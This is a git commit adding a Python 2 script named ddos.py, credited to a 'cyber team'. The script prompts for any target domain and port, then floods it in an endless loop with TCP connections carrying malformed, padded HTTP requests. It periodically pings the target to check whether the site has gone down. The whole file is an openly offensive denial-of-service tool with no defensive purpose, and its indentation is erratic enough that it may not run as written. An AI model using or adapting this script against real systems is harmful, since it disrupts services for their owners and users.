1c28fa268b065b33e1dc8f65d122158f6c32b5af
riskis7 <41503041+riskis7@users.noreply.github.com>
2018-08-03 20:35:21 +0700

    Add files via upload

---
+++ ddos.py
@@ -0,0 +1,63 @@
+from socket import *
+import time
+from urllib import urlopen
+import subprocess
+
+print(r'''
+Write By : Riskis7
+YouToube : BENGKULU CYBER TEAM
+Telegram : BENGKULU CYBER TEAM
+
+''')
+
+print
+
+domain = raw_input("\nTarget Domain(example.com)=> ")
+port = raw_input("Port(defualt 80)=> ")
+t = raw_input ("Time Send Packet=> ")
+
+if port == '':
+	       port = 80
+if t == '':
+       	 t = 1
+
+u = urlopen("http://"+domain)
+server = dict(u.headers)['server']
+ip = gethostbyname(domain)
+
+print
+print "[+]ipaddress => ",ip
+print "[+]server => ",server
+print 
+
+num = 0
+count = 100
+print "[*] Starting Attack to ",ip,'....\n'
+
+while True:
+  s = socket(AF_INET , SOCK_STREAM)
+  try:
+	              	s.connect((domain , int(port)))
+  except:
+	              	print "\n[!] Not Connected\n"
+	               exit()
+  s.send("GET http://"+domain+" HTTP 1.1\r\n"+"A"*100)
+  num = num+1
+  if num == count:
+	               print "\n[*] request ping for check ...\n"
+		              ping = subprocess.check_output("ping "+domain)
+		              if "Request Time Out." in ping:
+		                              print "\n[+] please run ping for ",domain,"\nDomian may become is **Down** :)\n"
+			                             raw_input("for send packet again press enter ...\n")
+		              else:
+	                       	pass
+		              count += 100
+
+
+  print "[+] Sendig Packet ",num
+  time.sleep(int(t))
+
+s.close()
+
+ 
+
